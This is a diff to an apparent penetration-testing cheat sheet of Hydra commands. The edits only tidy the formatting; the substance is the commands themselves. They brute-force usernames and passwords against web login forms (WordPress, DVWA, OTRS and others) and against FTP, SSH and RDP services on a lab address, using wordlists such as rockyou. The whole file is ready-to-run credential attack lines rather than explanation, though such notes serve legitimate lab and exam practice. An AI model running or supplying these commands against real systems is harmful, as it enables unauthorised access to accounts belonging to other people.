@@ -8,26 +8,26 @@
 ---
 # HTTP-POST (BURP for Help)
 
-### Usernames
-- `hydra -vV -L users.txt -p dontcare -f -t 2 192.168.200.5 http-post-form "/wp-login.php:user=^USER^&pwd=^PASS^&wp-submit=Log+In:=Invalid username" 
-- `hydra -vV -L users.txt -p dontcare -f -t 2 192.168.200.5 http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" ``
+## Usernames
+- `hydra -vV -L users.txt -p dontcare -f -t 2 192.168.200.5 http-post-form "/wp-login.php:user=^USER^&pwd=^PASS^&wp-submit=Log+In:=Invalid username"`
+- `hydra -vV -L users.txt -p dontcare -f -t 2 192.168.200.5 http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username"`
 
-### Bruteforce
-- `hydra -vV -l admin -P $rockyou -f -t 2  192.168.200.5 http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!" `
-- `hydra -vV -l admin -P $rockyou -f -t 2  192.168.200.5 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect" `
-- `hydra -vV -l admin -P $rockyou -f -t 64 192.168.200.5 http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" `
-- `hydra -vV -l admin -P $rockyou -f -t 64 192.168.200.5 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed" `
-- `hydra -vV -l root@localhost -P ./dict.txt -f -t 64 192.168.200.5 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I `
+## Bruteforce
+- `hydra -vV -l admin -P $rockyou -f -t 2  192.168.200.5 http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!"`
+- `hydra -vV -l admin -P $rockyou -f -t 2  192.168.200.5 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect"`
+- `hydra -vV -l admin -P $rockyou -f -t 64 192.168.200.5 http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect"`
+- `hydra -vV -l admin -P $rockyou -f -t 64 192.168.200.5 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"`
+- `hydra -vV -l root@localhost -P ./dict.txt -f -t 64 192.168.200.5 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I`
 
 ---
 # FTP
-- `hydra -l bob -P $smallpw 192.168.200.5 ftp -V -f  `
+- `hydra -l bob -P $smallpw 192.168.200.5 ftp -V -f`
 
 # SSH
 - `hydra -f -V -I -t 50 -l sunny -P $rockyou 192.168.200.5 ssh -s 22022`
 
 # RDP
-- `hydra -V -f -t 1 -L users.txt -P dict.txt rdp://192.168.200.5  `
+- `hydra -V -f -t 1 -L users.txt -P dict.txt rdp://192.168.200.5`
 - `hydra -V -f -t 1 -l cory -P $commontenk rdp://192.168.200.5`
 
 --- 
